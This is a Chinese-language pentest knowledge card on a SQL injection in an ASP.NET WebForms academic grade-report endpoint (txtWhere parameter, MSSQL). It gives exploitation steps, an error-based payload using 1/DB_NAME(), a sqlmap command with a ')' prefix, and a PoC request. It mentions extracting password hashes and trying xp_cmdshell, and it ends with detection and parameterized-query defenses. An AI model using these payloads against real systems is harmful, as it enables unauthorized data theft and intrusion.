---
id: web-generic-sqli-aspnet-webforms-report-txtwhere-mssql
title: ASP.NET WebForms 报表 txtWhere 拼接 WHERE：') 闭合与 1/DB_NAME() 报错注入
type: scenario
domain: web
path: web/generic/sqli
technique: aspnet-webforms-txtwhere-mssql-injection
aliases:
- txtWhere SQL 注入
- ASP.NET 报表 WHERE 拼接注入
- ctl00$cphMain$txtWhere
- MSSQL 括号闭合注入
- 1/DB_NAME() 报错注入
- 教务系统成绩报表注入
tags:
- web
- sqli
- mssql
- aspnet
- webforms
- error-based
- sqlmap
- report
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V74
  verified_at: '2026-11-05T16:39:47+08:00'
  notes: 已对照 content.md 与图15-17、19-22核对：ctl00%24cphMain%24txtWhere 单引号报错、') 闭合、sqlmap --prefix="')" --dbms=mssql --level 5 跑出 UNION/9 列、高级搜索 txtSearch* 参数同样注入均一致。未验证点：原文手工 payload 截图为 1/DB_NAME() 报错但未贴完整图，卡内按其说明整理；PoC 未复跑。
---

## 一句话结论

ASP.NET WebForms 教务系统的成绩报表接口把 `ctl00$cphMain$txtWhere` 参数直接拼到 SQL 的 WHERE 子句后，单引号即报错；实际注入点需要 `')` 闭合，SQLMap 指定 `--prefix="')"` 即可跑出数据，手工可用 `' AND 1/DB_NAME() ='` 触发类型转换报错。

## 原理

- 参数名 `txtWhere` 表明后端直接把用户输入当作 WHERE 条件片段拼接，而不是参数化查询；`ctl00$cphMain$` 是 ASP.NET WebForms 的控件命名前缀。
- 第一次单引号测试报错，但直接 `' OR 1=1--` 不生效，因为原始 SQL 形如 `... WHERE (某条件 + 用户输入 + ')` 或 `... WHERE ... IN ('...')`，用户输入位于括号/字符串内部，需要先用 `')` 闭合前面的括号与引号。
- 闭合后可构造布尔/报错/UNION 注入。原文使用 `' AND 1/DB_NAME() ='`：`1/DB_NAME()` 让 MSSQL 尝试把字符串 `DB_NAME()` 转成数值，触发类型转换错误并回显数据库名；末尾 `=` 使表达式成为布尔值，满足语法。
- SQLMap 在识别 DBMS 为 MSSQL 后，默认 payload 未考虑该括号上下文，需要 `--prefix="')"` 指定闭合前缀；加 `--dbms=mssql --level 5` 后成功提取数据。
- 同一套 ORM/报表代码往往在多个接口复用；`/Grade/Report1` 及高级搜索的 `txtSearchTitle`、`txtSearchCreated`、`txtSearchStart`、`txtSearchEnd` 等字段存在相同拼接，属于同一根因的多入口。
- 影响包括读取师生信息、账号口令哈希、写入数据；若账号权限高，还可尝试堆叠查询/`xp_cmdshell`（需按目标权限验证）。

## 触发条件

- 攻击者可访问后台报表/高级搜索功能（本例需登录后台）；
- 接口将 `txtWhere` 或类似搜索字段直接拼接到 SQL WHERE 子句；
- 数据库为 MSSQL（报错信息可区分），且应用回显数据库错误；
- 数据库账号对目标表有读权限。

## 利用步骤

1. 登录后台，进入成绩报表/高级搜索，输入单引号等特殊字符，观察是否返回 SQL 错误（如“字符串 ')' 后的引号不完整”“nvarchar 转换成 int 失败”）。
2. 根据报错中的 SQL 片段判断上下文，确定闭合前缀（本例为 `')`）。
3. 用布尔/报错 payload 验证，例如：
   ```sql
   ') AND 1/DB_NAME() ='
   ```
   观察错误信息中是否回显数据库名。
4. 用 SQLMap 指定前缀与 DBMS：
   ```bash
   sqlmap -r sql.txt --dbms="mssql" --prefix="')" --level 5 --batch
   ```
5. 枚举库表与目标字段，抽样验证数据；在授权范围内避免批量导出。
6. 在抓包历史中搜索同一参数名，测试 `/Grade/Report1` 及高级搜索的多个字段，确认受影响接口范围。

## PoC

请求（示意，参数值需 URL 编码）：

```http
POST /Grade/Report HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded

__EVENTTARGET=&__EVENTARGUMENT=&ctl00%24cphMain%24txtWhere=')+AND+1/DB_NAME()+%3D'&ctl00%24cphMain%24ddlCategory=...
```

报错 payload：

```text
') AND 1/DB_NAME() ='
```

SQLMap：

```bash
sqlmap -r sql.txt --dbms="mssql" --prefix="')" --level 5 --batch
```

原文通过该方式成功注入，并在其他报表/高级搜索接口发现同类注入。

## 变体与关联

- 变体：`txtSearchTitle`、`txtSearchCreated`、`txtSearchStart`、`txtSearchEnd` 等搜索字段使用不同拼接位置，闭合前缀可能不同，需要按报错调整。
- 变体：MSSQL 报错注入可替换为 `CONVERT(int, @@VERSION)`、`1/@@VERSION`、`updatexml` 等；有 UNION 回显时可直接取数据。
- 关联：[[web-generic-sqli-dotnet-handler-mssql-param-concat-version]]（.NET Handler 参数直拼 MSSQL 的同类场景）、[[web-generic-sqli-error-based-extraction]]（报错注入通用方法）。
- 边界：参数化查询/ORM 正确绑定、错误信息被关闭、账号无目标表权限时，注入不可用或数据不可读。

## 检测与防御

- 检测：报表/搜索请求参数中出现单引号、括号、`DB_NAME()`、`@@VERSION`、`1/` 等注入特征；响应返回 MSSQL 错误堆栈；同一会话对多个报表接口做相似 payload 测试。
- 防御：所有 SQL 使用参数化查询/ORM 绑定，禁止把用户输入拼进 WHERE、ORDER BY、表名等结构位置；对动态查询使用白名单。
- 防御：关闭详细数据库错误回显，统一错误页；数据库账号最小权限，禁用堆叠查询与高危存储过程。
- 加固：WAF 仅作辅助；对报表接口做输入校验与审计，定期用 SQLMap 回归测试。
